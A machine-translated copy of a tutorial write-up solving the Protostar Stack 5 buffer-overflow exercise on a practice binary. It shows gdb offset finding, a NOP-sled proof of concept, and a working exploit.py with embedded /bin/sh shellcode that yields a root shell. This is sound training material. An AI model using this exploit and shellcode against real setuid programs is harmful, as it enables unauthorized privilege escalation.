<html>
<head>
<title>[ExpDev] Exploit Exercise | Protostar | Stack 5</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[ExpDev]漏洞利用练习|原恒星|堆栈5</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/expdev-exploit-exercise-protostar-stack-5-c8d085c914e6?source=collection_archive---------0-----------------------#2020-05-13">https://infosecwriteups.com/expdev-exploit-exercise-protostar-stack-5-c8d085c914e6?source=collection_archive---------0-----------------------#2020-05-13</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div class="gh gi jq"><img src="../Images/b89de691df52e7b88b75c3cec56a545c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1198/format:webp/0*BTNw4g-6zN8hF-zx.png"/></div></figure><h1 id="3fe2" class="jx jy it bd jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku bi translated">堆栈5(堆栈缓冲区溢出)</h1><p id="255e" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">这是一个标准的缓冲区溢出漏洞，我们将使用外壳代码来获取第一个根外壳。</p><ul class=""><li id="54f8" class="lt lu it kx b ky lv lc lw lg lx lk ly lo lz ls ma mb mc md bi translated">链接:<a class="ae me" href="https://exploit-exercises.lains.space/protostar/stack5/" rel="noopener ugc nofollow" target="_blank">https://exploit-exercises.lains.space/protostar/stack5/</a></li></ul><figure class="mg mh mi mj gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mk ml di mm bf mn"><div class="gh gi mf"><img src="../Images/031adee3b4a8dabff8766af074ca0169.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BEFDjNbFWOXOXbDCU6ECgw.png"/></div></div></figure><h2 id="c1c3" class="mo jy it bd jz mp mq dn kd mr ms dp kh lg mt mu kl lk mv mw kp lo mx my kt mz bi translated">注意事项</h2><ul class=""><li id="c7e0" class="lt lu it kx b ky kz lc ld lg na lk nb lo nc ls ma mb mc md bi translated"><code class="fe nd ne nf ng b">gets(buffer);</code>:易受攻击的函数。它从stdin中读取一行，但不检查缓冲区溢出→这容易受到BOF类型的攻击。</li><li id="e5a5" class="lt lu it kx b ky nh lc ni lg nj lk nk lo nl ls ma mb mc md bi translated"><code class="fe nd ne nf ng b">char buffer[64];</code>:这将我们的缓冲区长度限制为64字节。→我们可以输入超过64个字节来引起BOF。</li></ul><h1 id="1a3c" class="jx jy it bd jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku bi translated">剥削</h1><p id="ef03" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">这个程序非常简单，它只接受我们提供的任何输入。</p><h2 id="af48" class="mo jy it bd jz mp mq dn kd mr ms dp kh lg mt mu kl lk mv mw kp lo mx my kt mz bi translated">寻找偏移</h2><p id="7d4d" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">让我们创建一个python脚本来查找可以控制EIP的偏移值:</p><pre class="mg mh mi mj gt nm ng nn no aw np bi"><span id="2d18" class="mo jy it ng b gy nq nr l ns nt">#!/usr/bin/python</span><span id="3f9c" class="mo jy it ng b gy nu nr l ns nt">padding = "A" * 70<br/>padding+= "BBBBCCCCDDDDEEEEFFFFGGGG"</span><span id="46ec" class="mo jy it ng b gy nu nr l ns nt">print padding</span></pre><p id="6c58" class="pw-post-body-paragraph kv kw it kx b ky lv la lb lc lw le lf lg nv li lj lk nw lm ln lo nx lq lr ls im bi translated">然后，在一个文件中创建一个漏洞利用的输出，以便我们可以用gdb运行它。</p><pre class="mg mh mi mj gt nm ng nn no aw np bi"><span id="ff11" class="mo jy it ng b gy nq nr l ns nt">$ python exp.py &gt; /tmp/stack5/exploit</span></pre><p id="823d" class="pw-post-body-paragraph kv kw it kx b ky lv la lb lc lw le lf lg nv li lj lk nw lm ln lo nx lq lr ls im bi translated">现在，运行gdb并提供漏洞文件。</p><pre class="mg mh mi mj gt nm ng nn no aw np bi"><span id="0fa1" class="mo jy it ng b gy nq nr l ns nt"><strong class="ng iu">$ gdb -q stack5</strong><br/>  Reading symbols from /opt/protostar/bin/stack5...done.<br/><strong class="ng iu">(gdb) break * main</strong><br/>  Breakpoint 1 at 0x80483c4: file stack5/stack5.c, line 7.<br/><strong class="ng iu">(gdb) set disassembly-flavor intel</strong><br/><strong class="ng iu">(gdb) disassemble main</strong><br/>  Dump of assembler code for function main:<br/>  0x080483c4 &lt;main+0&gt;: push   ebp<br/>  0x080483c5 &lt;main+1&gt;: mov    ebp,esp<br/>  0x080483c7 &lt;main+3&gt;: and    esp,0xfffffff0<br/>  0x080483ca &lt;main+6&gt;: sub    esp,0x50<br/>  0x080483cd &lt;main+9&gt;: lea    eax,[esp+0x10]<br/>  0x080483d1 &lt;main+13&gt;: mov    DWORD PTR [esp],eax<br/>  0x080483d4 &lt;main+16&gt;: call   0x80482e8 &lt;gets@plt&gt;<br/>  0x080483d9 &lt;main+21&gt;: leave  <br/>  0x080483da &lt;main+22&gt;: ret    <br/>  End of assembler dump.<br/><strong class="ng iu">(gdb) r &lt; /tmp/stack5/exploit</strong><br/>  Starting program: /opt/protostar/bin/stack5 &lt; /tmp/stack5/exploit</span><span id="b16e" class="mo jy it ng b gy nu nr l ns nt">  Breakpoint 1, main (argc=1, argv=0xbffff854) at stack5/stack5.c:7<br/>  7 stack5/stack5.c: No such file or directory. in stack5/stack5.c<br/><strong class="ng iu">(gdb) continue</strong><br/>  Continuing.</span><span id="002e" class="mo jy it ng b gy nu nr l ns nt">  Program received signal SIGSEGV, Segmentation fault.<br/>  <strong class="ng iu">0x44444343 </strong>in ?? ()                             </span></pre><p id="2dd0" class="pw-post-body-paragraph kv kw it kx b ky lv la lb lc lw le lf lg nv li lj lk nw lm ln lo nx lq lr ls im bi translated">“0x43”和“0x44”在ASCII表示中分别是“C”和“D”。因此，偏移量为76 (= 70 + "BBBBCC ")。</p><pre class="mg mh mi mj gt nm ng nn no aw np bi"><span id="c997" class="mo jy it ng b gy nq nr l ns nt"><strong class="ng iu">...<br/>(gdb) continue</strong><br/>  Continuing.</span><span id="fe5b" class="mo jy it ng b gy nu nr l ns nt">  Program received signal SIGSEGV, Segmentation fault.<br/>  <strong class="ng iu">0x44444343 </strong>in ?? ()                             </span><span id="f2c7" class="mo jy it ng b gy nu nr l ns nt"><strong class="ng iu">(gdb) info registers</strong><br/>  eax            0xbffff760 -1073744032<br/>  ecx            0xbffff760 -1073744032<br/>  edx            0xb7fd9334 -1208118476<br/>  ebx            0xb7fd7ff4 -1208123404<br/>  esp            0xbffff7b0 0xbffff7b0<br/>  ebp            0x43434242 0x43434242<br/>  esi            0x0 0<br/>  edi            0x0 0<br/>  <strong class="ng iu">eip            0x44444343 0x44444343  &lt;---- EIP Overflowed</strong><br/>  eflags          0x210246 [ PF ZF IF RF ID ]</span></pre><p id="ab86" class="pw-post-body-paragraph kv kw it kx b ky lv la lb lc lw le lf lg nv li lj lk nw lm ln lo nx lq lr ls im bi translated">此外，现在我们可以在崩溃时控制EIP，这意味着我们可以跳转到堆栈中的任何位置。</p><h2 id="d084" class="mo jy it bd jz mp mq dn kd mr ms dp kh lg mt mu kl lk mv mw kp lo mx my kt mz bi translated">代码执行</h2><p id="951d" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">不同于之前的练习，没有我们可以跳转到的制胜语句。相反，我们可以在堆栈上引入自己的外壳代码并执行它。</p><p id="846b" class="pw-post-body-paragraph kv kw it kx b ky lv la lb lc lw le lf lg nv li lj lk nw lm ln lo nx lq lr ls im bi translated">但是要记住的一点是，栈地址会根据<code class="fe nd ne nf ng b">PWD=</code>环境变量而改变。为了避免这种情况，我们可以简单地在sleds代码前添加几个NOP(无操作)sleds (= \x90)，并将我们的EIP指向NOP的中间。我们可以使用以下PoC脚本来确认这一点:</p><pre class="mg mh mi mj gt nm ng nn no aw np bi"><span id="21d5" class="mo jy it ng b gy nq nr l ns nt"><strong class="ng iu">[exploit.py]</strong></span><span id="784c" class="mo jy it ng b gy nu nr l ns nt">#!/usr/bin/python</span><span id="ee15" class="mo jy it ng b gy nu nr l ns nt">import struct</span><span id="0efb" class="mo jy it ng b gy nu nr l ns nt"><strong class="ng iu">### Offset</strong><br/>padding = "A" * 76</span><span id="3e22" class="mo jy it ng b gy nu nr l ns nt"><strong class="ng iu">### EIP --&gt; Middle of Random NOPs</strong><br/>eip = struct.pack("I", 0xbffff7cc)         <strong class="ng iu"> </strong></span><span id="8969" class="mo jy it ng b gy nu nr l ns nt"><strong class="ng iu">### Adding NOP Sleds</strong><br/>nop = "\x90" * 80</span><span id="b0ba" class="mo jy it ng b gy nu nr l ns nt"><strong class="ng iu">### Adding int3 (= Breakpoint)</strong><br/>payload = "\xCC" * 4</span><span id="f3a3" class="mo jy it ng b gy nu nr l ns nt">print padding + eip + nop + payload</span></pre><figure class="mg mh mi mj gt ju gh gi paragraph-image"><div class="gh gi ny"><img src="../Images/8f286cbfce33ac071479f3212d8bfd5a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1390/format:webp/1*vnDg3cboIidzJx0HiVlirg.png"/></div></figure><p id="ca01" class="pw-post-body-paragraph kv kw it kx b ky lv la lb lc lw le lf lg nv li lj lk nw lm ln lo nx lq lr ls im bi translated">正如预期的那样，一旦我们的EIP落在nop的中间，它就继续使用我们的int3 (\xCC)断点击中<code class="fe nd ne nf ng b">0xbffff801</code>。</p><h2 id="262e" class="mo jy it bd jz mp mq dn kd mr ms dp kh lg mt mu kl lk mv mw kp lo mx my kt mz bi translated">外壳代码</h2><p id="f172" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">我们现在可以更新我们的<code class="fe nd ne nf ng b">exploit.py</code>脚本，添加一个shell代码，作为“根”用户获得一个交互式shell。(所有程序都以setuid位作为root)</p><figure class="mg mh mi mj gt ju gh gi paragraph-image"><div class="gh gi nz"><img src="../Images/47c7c86ea02bbdbac2943966214c292e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1238/format:webp/1*fL6ax6HOZVpBnqIaYqnqaA.png"/></div></figure><pre class="mg mh mi mj gt nm ng nn no aw np bi"><span id="d954" class="mo jy it ng b gy nq nr l ns nt"><strong class="ng iu">[exploit.py]</strong></span><span id="7bd0" class="mo jy it ng b gy nu nr l ns nt">#!/usr/bin/python</span><span id="acb5" class="mo jy it ng b gy nu nr l ns nt">import struct</span><span id="4525" class="mo jy it ng b gy nu nr l ns nt">padding = "A" * 76</span><span id="5238" class="mo jy it ng b gy nu nr l ns nt">eip = struct.pack("I", 0xbffff7cc)</span><span id="f258" class="mo jy it ng b gy nu nr l ns nt">nop = "\x90" * 80</span><span id="158a" class="mo jy it ng b gy nu nr l ns nt"><strong class="ng iu">### </strong><a class="ae me" href="http://shell-storm.org/shellcode/files/shellcode-811.php" rel="noopener ugc nofollow" target="_blank"><strong class="ng iu">http://shell-storm.org/shellcode/files/shellcode-811.php</strong></a><strong class="ng iu"><br/>### Used a shellcode (x86 '/bin/sh') found in the Internet</strong></span><span id="38b5" class="mo jy it ng b gy nu nr l ns nt">shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73" +<br/>             "\x68\x68\x2f\x62\x69\x6e\x89" +<br/>             "\xe3\x89\xc1\x89\xc2\xb0\x0b" +<br/>             "\xcd\x80\x31\xc0\x40\xcd\x80")</span><span id="6a47" class="mo jy it ng b gy nu nr l ns nt">print padding + eip + nop + shellcode</span></pre><p id="6f6b" class="pw-post-body-paragraph kv kw it kx b ky lv la lb lc lw le lf lg nv li lj lk nw lm ln lo nx lq lr ls im bi translated">当我们运行有效载荷时，</p><pre class="mg mh mi mj gt nm ng nn no aw np bi"><span id="dd63" class="mo jy it ng b gy nq nr l ns nt">$ python exploit.py &gt; /tmp/stack5/exploit<br/>$ cat /tmp/stack5/exploit | ./stack5</span></pre><p id="2ff8" class="pw-post-body-paragraph kv kw it kx b ky lv la lb lc lw le lf lg nv li lj lk nw lm ln lo nx lq lr ls im bi translated">它实际上什么也不做。是因为<code class="fe nd ne nf ng b">/bin/sh</code> shell期望stdin然而，当我们执行我们利用时没有标准输入，所以它立即关闭。</p><p id="6c44" class="pw-post-body-paragraph kv kw it kx b ky lv la lb lc lw le lf lg nv li lj lk nw lm ln lo nx lq lr ls im bi translated">我们可以做的一个技巧是，我们可以在利用脚本中添加<code class="fe nd ne nf ng b">cat</code>命令，让它在运行时等待stdin:</p><pre class="mg mh mi mj gt nm ng nn no aw np bi"><span id="7044" class="mo jy it ng b gy nq nr l ns nt">$ (python exploit.py; cat) | /opt/protostar/bin/stack5</span></pre><figure class="mg mh mi mj gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mk ml di mm bf mn"><div class="gh gi oa"><img src="../Images/5cd7280f1959d2251167a2d7ec6c8f9d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YPj_MEaXuwgv30JlhMD-xA.png"/></div></div></figure><p id="bc9a" class="pw-post-body-paragraph kv kw it kx b ky lv la lb lc lw le lf lg nv li lj lk nw lm ln lo nx lq lr ls im bi translated">当我们运行它时，我们可以使用root权限成功打开一个<code class="fe nd ne nf ng b">/bin/sh</code> shell。感谢阅读！</p><h2 id="8116" class="mo jy it bd jz mp mq dn kd mr ms dp kh lg mt mu kl lk mv mw kp lo mx my kt mz bi translated">下一个挑战:</h2><ul class=""><li id="177a" class="lt lu it kx b ky kz lc ld lg na lk nb lo nc ls ma mb mc md bi translated"><a class="ae me" href="https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6" rel="noopener"> <strong class="kx iu">栈6 </strong> </a> <strong class="kx iu"> </strong> —基于栈的BOF: ROP (ret2libc)</li></ul><figure class="mg mh mi mj gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mk ml di mm bf mn"><div class="gh gi ob"><img src="../Images/d890d1dc0707d214841d98ff16b63472.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*AIH552DI8R_OHuVw.png"/></div></div></figure></div></div>    
</body>
</html>